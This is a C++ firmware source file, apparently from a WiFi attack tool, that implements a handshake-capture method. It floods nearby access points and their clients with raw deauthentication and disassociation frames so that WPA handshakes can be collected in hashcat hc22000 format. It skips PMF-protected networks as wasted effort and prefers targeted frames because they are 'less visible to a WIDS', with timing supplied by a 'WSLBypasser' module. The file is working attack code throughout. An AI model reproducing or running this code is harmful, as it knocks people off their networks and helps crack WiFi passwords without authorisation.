#include "method_ctx.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include <Arduino.h>
#include <string.h>

namespace Cap {
namespace Methods {

void ours(const Ctx& ctx) {
    // STEALTH (!bidir && !authFlood): stay quiet. CSA still honored if pack
    // asked for it. Same rule as PORK/PAN so packs compose with any method.
    if (!ctx.bidirKick && !ctx.authFlood) {
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }

    uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
    for (uint8_t i = 0; i < ctx.beaconCount; i++) {
        const BeaconSlot& b = ctx.beacons[i];
        if (b.channel != ctx.channel) continue;
        if (ctx.isOwnAp(b.bssid)) continue;
        if (ctx.skipPin(b.bssid)) continue;
        if (ctx.isSkipped && ctx.isSkipped(b.bssid)) continue;
        if (b.rssi < ctx.minRssi) continue;
        if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
        if (b.pmfCapable) continue; // deauth/disassoc will be dropped, don't waste airtime

        // Prefer an address-1 hit on the known associated client over broadcast:
        // targeted frames are far more likely to be honored and are less visible to a WIDS.
        if (ctx.kickStaOk && memcmp(ctx.kickBssid, b.bssid, 6) == 0) {
            for (uint8_t r = 0; r < rounds; r++) {
                ctx.sendRawMgmt(0xC0, b.bssid, ctx.kickSta);
                delay(WSLBypasser::burstLegGapMs());
                ctx.sendRawMgmt(0xA0, b.bssid, ctx.kickSta);
                if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
            }
        } else {
            for (uint8_t r = 0; r < rounds; r++) {
                ctx.sendRawMgmt(0xC0, b.bssid, ctx.bcast);
                delay(WSLBypasser::burstLegGapMs());
                ctx.sendRawMgmt(0xA0, b.bssid, ctx.bcast);
                if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
            }
        }
        yield();
    }

    // Pack knob — works with OURS the same way as with PORK/PAN.
    if (ctx.csaHerd) csaHerd(ctx);
}

// RADIO→EDIT knobs this method actually reads from Ctx (0-terminated).
// 9=KICK N 10=BIDIR 13=CSA 14=AUTH FLOOD 15=REASON 31=BURST
static const uint8_t oursKnobs[] = {9, 10, 13, 14, 15, 31, 0};

CAP_METHOD_REGISTER("ALL", ours, nullptr, nullptr, oursKnobs)

} // namespace Methods
} // namespace Cap
